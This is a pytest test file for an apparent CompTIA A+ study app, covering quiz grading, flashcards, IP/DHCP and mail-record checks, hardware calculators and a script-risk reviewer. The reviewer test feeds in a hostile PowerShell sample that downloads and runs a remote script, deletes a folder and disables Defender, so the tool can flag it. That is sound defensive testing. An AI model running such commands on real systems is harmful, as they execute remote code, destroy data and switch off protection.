import pytest

from app.services import aplus_data as D
from app.services import aplus_lab as a
from app.services.aplus_acronyms import ACRONYMS


def test_objective_map_and_weights():
    assert len(D.OBJECTIVES) == 63 and sum(1 for o in D.OBJECTIVES if o[1] == "1") == 27 and sum(1 for o in D.OBJECTIVES if o[1] == "2") == 36
    for ex, e in D.EXAMS.items():
        assert sum(w for _, w in e["domains"].values()) == 100
        assert {o[2] for o in D.OBJECTIVES if o[1] == ex} == set(e["domains"])
    assert len({(o[0], o[1]) for o in D.OBJECTIVES}) == 63


def test_question_bank_is_sound():
    bank = a._bank()
    assert len(bank) >= 90 and len({q["id"] for q in bank}) == len(bank)
    objs = {o["id"] for o in a.objectives()["objectives"]}
    for q in bank:
        assert q["obj"] in objs and len(q["options"]) == 4 and len(set(q["options"])) == 4 and 0 <= q["answer"] < 4 and q["why"]
    assert len({q["answer"] for q in bank}) == 4          # the right answer is not always in one slot
    for (ex, dom), qs in D.QUESTIONS.items():
        assert dom in D.EXAMS[ex]["domains"] and qs


def test_quiz_grading_and_progress(client):
    q = client.get("/api/aplus/quiz?exam=1&domain=networking&n=5&seed=3").json()
    assert len(q["questions"]) == 5 and "answer" not in q["questions"][0]
    bank = {x["id"]: x for x in a._bank()}
    ans = {x["id"]: bank[x["id"]]["answer"] for x in q["questions"]}
    r = client.post("/api/aplus/quiz/grade", json={"answers": ans}).json()
    assert r["right"] == 5 and r["pct"] == 100 and not r["review"]
    wrong = {k: (v + 1) % 4 for k, v in ans.items()}
    r2 = client.post("/api/aplus/quiz/grade", json={"answers": wrong}).json()
    assert r2["right"] == 0 and r2["review"]
    assert client.post("/api/aplus/quiz/grade", json={"answers": {"nope": 1}}).status_code == 404
    assert client.post("/api/aplus/quiz/grade", json={"answers": {next(iter(ans)): 9}}).status_code == 400
    o = client.get("/api/aplus").json()
    net = next(d for d in next(e for e in o["exams"] if e["exam"] == "1")["domains"] if d["key"] == "networking")
    assert net["practice_answered"] == 10 and net["practice_pct"] == 50
    assert client.post("/api/aplus/level", json={"objective": "1:2.1", "level": 3}).status_code == 200
    assert client.post("/api/aplus/level", json={"objective": "9:9.9", "level": 1}).status_code == 404
    assert client.post("/api/aplus/level", json={"objective": "1:2.1", "level": 7}).status_code == 400
    o = client.get("/api/aplus").json()
    assert next(x for x in o["objectives"] if x["id"] == "1:2.1")["level"] == 3 and next(e for e in o["exams"] if e["exam"] == "1")["readiness_pct"] > 0
    assert client.delete("/api/aplus/quiz/results").json()["cleared"]
    assert client.get("/api/aplus/quiz?domain=nonsense").status_code == 404


def test_acronyms_corrected_and_cards(client):
    assert ACRONYMS["HDMI"][0] == "High-Definition Multimedia Interface" and ACRONYMS["WISP"][0].startswith("Wireless") and ACRONYMS["CAC"][0] == "Common Access Card"
    assert "XXS" not in ACRONYMS and ACRONYMS["XSS"][0] == "Cross-site Scripting" and "Computing" in ACRONYMS["VNC"][0] and ACRONYMS["RADIUS"][0].endswith("Service")
    c = client.get("/api/aplus/cards?kind=acronyms&n=10&exam=1").json()
    assert len(c["cards"]) == 10 and c["available"] > 100
    p = client.get("/api/aplus/cards?kind=ports&n=50").json()
    assert any(x["front"] == "Port 3389" and "RDP" in x["back"] for x in p["cards"])
    assert client.get("/api/aplus/cards?kind=zzz").status_code == 400


def test_symptoms_and_reference(client):
    r = client.get("/api/aplus/symptoms?q=clicking").json()
    assert r["results"] and r["results"][0]["obj"] == "1:5.2" and len(r["method"]) == 6
    assert client.get("/api/aplus/symptoms?exam=2").json()["results"]
    assert client.get("/api/aplus/symptoms?q=zzzqqq").json()["results"] == []
    ref = client.get("/api/aplus/reference").json()
    assert {"network", "cables", "os", "security", "ops"} <= set(ref["topics"]) and any(p["port"] == "443" for p in ref["ports"])
    assert client.get("/api/aplus/reference?topic=nope").status_code == 404


def test_ip_dhcp(client):
    assert a.ip_check("169.254.1.9")["kind"].startswith("APIPA")
    assert a.ip_check("172.20.1.5")["kind"] == "private" and a.ip_check("172.32.1.5")["kind"] == "public" and a.ip_check("fe80::1")["kind"].startswith("link-local")
    bad = a.ip_check("192.168.1.10", "255.255.255.0", "192.168.2.1")
    assert any("outside" in n for n in bad["notes"]) and bad["usable_hosts"] == 254
    assert any("same network" in n for n in a.ip_check("192.168.1.10", "255.255.255.0", "192.168.1.1")["notes"])
    for args in (("nonsense",), ("10.0.0.1", "255.0.255.0")):
        with pytest.raises(a.AplusError):
            a.ip_check(*args)
    d = a.dhcp_scope("192.168.1.0/24", "192.168.1.100", "192.168.1.150", ["192.168.1.100-192.168.1.104"], 3, 60, 24)
    assert d["pool"] == 51 and d["excluded"] == 5 and d["available"] == 43 and any("only 43" in n for n in d["notes"])
    with pytest.raises(a.AplusError):
        a.dhcp_scope("192.168.1.0/24", "192.168.2.1", "192.168.2.9")
    with pytest.raises(a.AplusError):
        a.dhcp_scope("192.168.1.0/24", "192.168.1.0", "192.168.1.9")
    assert client.post("/api/aplus/ip", json={"address": "10.1.1.1"}).json()["kind"] == "private"


def test_mail_records():
    m = a.mail_records('v=spf1 include:_spf.example.com +all\nv=DMARC1; p=none\nv=DKIM1; k=rsa; p=')
    kinds = {r["type"]: r for r in m["records"]}
    assert any(f["level"] == "bad" for f in kinds["SPF"]["findings"])
    assert any("monitors" in f["message"] for f in kinds["DMARC"]["findings"]) and any("rua" in f["message"] for f in kinds["DMARC"]["findings"])
    assert any("revoked" in f["message"] for f in kinds["DKIM"]["findings"])
    good = a.mail_records("v=spf1 include:a.example -all\nv=DMARC1; p=reject; rua=mailto:r@example.com")
    assert all(f["level"] != "bad" for r in good["records"] for f in r["findings"])
    many = a.mail_records("v=spf1 " + " ".join(f"include:s{i}.example" for i in range(11)) + " -all")
    assert any("10" in f["message"] for f in many["records"][0]["findings"])
    two = a.mail_records("v=spf1 -all\nv=spf1 ~all")
    assert any("only one" in f["message"] for r in two["records"] for f in r["findings"])
    with pytest.raises(a.AplusError):
        a.mail_records("hello world")


def test_display_psu_backup():
    d = a.display_calc(1920, 1080, 24, 144)
    assert d["pixel_density_ppi"] == 91.8 and d["aspect_ratio"] == "16:9" and d["name"] == "Full HD (1080p)"
    p = a.psu_size(cpu_w=125, gpu_w=285, drives=2, fans=4, ram_sticks=2, other_w=20, headroom_pct=30)
    assert p["load_w"] == 125 + 285 + 50 + 8 + 14 + 12 + 20 and p["suggested_psu_w"] >= p["with_headroom_w"]
    b = a.backup_plan(100, 5, 28, 7)
    s = {x["scheme"]: x for x in b["schemes"]}
    assert s["Full every day"]["stored_gb"] == 2800 and s["Incremental"]["restore_sets"] == 7 and s["Differential"]["restore_sets"] == 2
    assert s["Incremental"]["stored_gb"] < s["Differential"]["stored_gb"] < s["Full every day"]["stored_gb"] and b["rule_3_2_1"]["meets"]
    assert not a.backup_plan(100, 5, 28, 7, 2, 1, 0)["rule_3_2_1"]["meets"]
    with pytest.raises(a.AplusError):
        a.display_calc(10, 10, 5)


def test_script_reviewer(client):
    bad = a.script_review("iex (New-Object Net.WebClient).DownloadString('http://x/y.ps1')\nRemove-Item C:\\data -Recurse -Force\nSet-MpPreference -DisableRealtimeMonitoring $true", "fix.ps1")
    assert bad["type"] == "PowerShell" and "high risk" in bad["verdict"] and {f["level"] for f in bad["findings"]} == {"bad"} and len(bad["findings"]) >= 3
    ok = a.script_review("echo off\nipconfig /all > c:\\temp\\net.txt", "report.bat")
    assert ok["type"] == "Windows batch" and "nothing obviously dangerous" in ok["verdict"]
    assert a.script_review("#!/bin/bash\nrm -rf /tmp/build", "")["findings"][0]["level"] == "bad"
    assert client.post("/api/aplus/script", json={"text": "  "}).status_code == 400
    assert client.post("/api/aplus/backup", json={"full_gb": 50, "daily_change_gb": 2}).status_code == 200
